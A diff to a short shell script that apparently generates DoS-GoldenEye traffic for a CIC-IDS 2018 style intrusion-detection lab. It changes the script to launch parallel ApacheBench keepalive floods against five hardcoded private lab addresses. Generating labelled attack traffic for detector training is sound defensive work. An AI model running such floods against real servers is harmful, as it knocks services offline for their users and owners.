@@ -13,9 +13,13 @@
 # different per-flow feature profile.
 #
 # Maps to CIC-IDS 2018 class DoS-GoldenEye (class 4).
-TARGET=${1:-http://172.20.0.10/}
-COUNT=${2:-50000}
-CONC=${3:-100}
+COUNT=${1:-50000}
+CONC=${2:-100}
 
-echo "[attack] GoldenEye keepalive flood -> $TARGET  $COUNT requests  concurrency $CONC"
-ab -n "$COUNT" -c "$CONC" -k "$TARGET"
+VICTIMS="172.20.0.10 172.20.0.11 172.20.0.12 172.20.0.13 172.20.0.14"
+
+echo "[attack] GoldenEye keepalive flood -> all nodes  $COUNT requests each  concurrency $CONC"
+for ip in $VICTIMS; do
+    ab -n "$COUNT" -c "$CONC" -k "http://$ip/" &
+done
+wait
